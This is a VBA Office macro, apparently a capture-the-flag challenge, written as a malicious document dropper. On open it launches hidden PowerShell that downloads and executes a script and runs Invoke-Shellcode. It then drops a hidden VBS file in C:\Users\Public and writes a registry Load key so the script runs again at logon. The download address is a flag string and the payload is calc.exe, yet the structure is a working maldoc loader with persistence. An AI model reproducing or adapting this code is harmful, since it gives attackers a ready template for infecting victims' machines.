Sub Auto_Open()
Execute
Persist
Reg
Start
End Sub
 Public Function Execute() As Variant
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('UMDCTF-{o^b^f^u^s^c^a^t^e^d}')); Invoke-Shellcode -Payload calc.exe -Lhost 127.0.0.1 -Lport 1337 -Force", Null, objConfig, intProcessID
     End Function

Public Function Persist() As Variant
 Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
    a.WriteLine ("Dim objShell")
    a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('UMDCTF-{o^b^f^u^s^c^a^t^e^d}')); Invoke-Shellcode -Payload calc.exe -Lhost 127.0.0.1 -Lport 1337 -Force;""")
    a.WriteLine ("objShell.Run command,0")
    a.WriteLine ("Set objShell = Nothing")
    a.Close
    GivenLocation = "C:\Users\Public\"
    OldFileName = "config.txt"
    NewFileName = "config.vbs"
    Name GivenLocation & OldFileName As GivenLocation & NewFileName
    SetAttr "C:\Users\Public\config.vbs", vbHidden
End Function
Public Function Reg() As Variant
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Public\config.vbs", "REG_SZ"
Set WshShell = Nothing
End Function
Public Function Start() As Variant
 Const HIDDEN_WINDOW = 0
        strComputer = "."
        Shell "wscript C:\Users\Public\config.vbs", vbNormalFocus

End Function
